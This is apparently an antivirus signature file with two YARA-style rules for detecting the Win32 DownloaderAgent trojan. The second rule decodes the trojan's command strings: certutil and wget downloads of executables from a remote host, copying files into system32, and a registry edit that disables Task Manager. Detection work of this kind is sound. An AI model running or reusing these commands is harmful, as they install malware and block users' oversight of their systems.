
rule Trojan_Win32_DownloaderAgent_PA_MTB{
	meta:
		description = "Trojan:Win32/DownloaderAgent.PA!MTB,SIGNATURE_TYPE_PEHSTR,01 00 01 00 01 00 00 "
		
	strings :
		$a_01_0 = {8b 55 00 8d ac 24 1c 01 00 00 89 54 24 04 0f b6 14 02 88 14 24 8d 56 01 89 d7 c1 ff 1f c1 ef 18 8d 74 3e 01 81 e6 00 ff ff ff 29 f2 0f b6 7c 14 08 01 f9 89 ce c1 fe 1f c1 ee 18 01 ce 81 e6 00 ff ff ff 29 f1 0f b6 5c 0c 08 88 5c 14 08 89 fb 88 5c 0c 08 0f b6 5c 14 08 01 fb 0f b6 f3 8a 3c 24 32 7c 34 08 8b 74 24 04 88 3c 06 40 89 d6 3b 45 04 7c } //1
	condition:
		((#a_01_0  & 1)*1) >=1
 
}
rule Trojan_Win32_DownloaderAgent_PA_MTB_2{
	meta:
		description = "Trojan:Win32/DownloaderAgent.PA!MTB,SIGNATURE_TYPE_PEHSTR,06 00 06 00 06 00 00 "
		
	strings :
		$a_01_0 = {63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 68 74 74 70 3a 2f 2f 64 6f 77 6e 2e 75 73 2d 68 61 63 6b 2e 72 75 2f 77 67 65 74 2e 65 78 65 } //1 certutil.exe -urlcache -split -f http://down.us-hack.ru/wget.exe
		$a_01_1 = {63 6f 70 79 20 2f 79 20 77 67 65 74 2e 65 78 65 20 25 77 69 6e 64 69 72 25 5c 73 79 73 74 65 6d 33 32 5c } //1 copy /y wget.exe %windir%\system32\
		$a_01_2 = {74 61 73 6b 6b 69 6c 6c 20 2f 69 6d 20 73 76 73 68 6f 73 62 2e 65 78 65 20 2d 66 } //1 taskkill /im svshosb.exe -f
		$a_01_3 = {72 65 67 20 61 64 64 20 22 48 4b 43 55 5c 53 6f 66 74 77 61 72 65 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 43 75 72 72 65 6e 74 56 65 72 73 69 6f 6e 5c 50 6f 6c 69 63 69 65 73 5c 53 79 73 74 65 6d 22 20 2f 76 20 27 22 44 69 73 61 62 6c 65 54 61 73 6b 4d 67 72 22 20 2f 64 20 31 20 2f 74 20 52 45 47 5f 44 57 4f 52 44 20 2f 66 } //1 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v '"DisableTaskMgr" /d 1 /t REG_DWORD /f
		$a_01_4 = {77 67 65 74 20 68 74 74 70 3a 2f 2f 64 6f 77 6e 2e 75 73 2d 68 61 63 6b 2e 72 75 2f 61 67 77 6c 2e 65 78 65 } //1 wget http://down.us-hack.ru/agwl.exe
		$a_01_5 = {43 3a 5c 57 69 6e 64 6f 77 73 5c 54 61 73 6b 73 5c 68 6f 6f 6b 5c 73 76 63 68 6f 73 74 73 2e 65 78 65 } //1 C:\Windows\Tasks\hook\svchosts.exe
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=6
 
}